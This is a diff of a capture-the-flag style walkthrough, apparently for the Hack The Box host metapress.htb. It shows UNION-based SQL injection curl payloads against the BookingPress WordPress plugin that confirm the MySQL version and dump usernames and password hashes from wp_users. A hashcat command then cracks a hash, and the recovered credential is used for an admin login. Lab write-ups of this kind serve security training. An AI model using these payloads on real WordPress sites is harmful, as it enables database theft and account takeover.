@@ -64,12 +64,30 @@ Searching for confirmed vulnerability, the exploitation uses vulnerability insid
 ```bash
 curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=ba6f278b09&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
 ```
+
 <br>
 
-Becacuse of the weak sanitization and it is confirmed that the internal database is MySQL, it is confirmed that the internal database could be accessed with `UNION` injection once the attacker knows value of `_wpnonce`. In this case, it could be found on the source of the outdated `BookingPress` source page:
+Becacuse of the weak sanitization and it is confirmed that the internal database is MySQL, it is confirmed that the internal database could be accessed with `UNION` injection once the attacker knows value of `_wpnonce`. In this case, it could be found on the source of the outdated `BookingPress` source page. As shown below, the value, in this case, was `ca4101431a`:
 <img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/fbf6e1bc-e788-4750-9fe0-b926110a6c67" />
 
+<br>
 
+Once the attacker confirmed the attack is working via checking the basic information about database, he/she could change the payload for getting credentials out of database. Since tables and databases of `WordPress` is well known, only by changing necessary parts of payload for gathering information could easily allow access to the user credential. Following is the payload for getting user credentials and output organization:
+```bash
+curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=ca4101431a&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_pass,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -' | jq .
+```
+<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/93b1c1a4-b939-454f-8ccd-59876994196a" />
+
+<br>
+
+As shown above, database allowed malicious actor to access the existing user credentials. Hashcat was used to crack the found password hashes:
+```bash
+hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt
+```
+Unfortunately, hashcat couldn't break the hash value of user `admin`. However, hashcat successfully cracked the password hash of username `manager`, which is `partylikearockstar`. Using the found credential `manager:partylikearockstar`, it was successful to login as administrator into `wp-admin`:
+<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/2887a608-9182-4ace-af99-8c89d7034935" />
+
+<br>
 
 
 
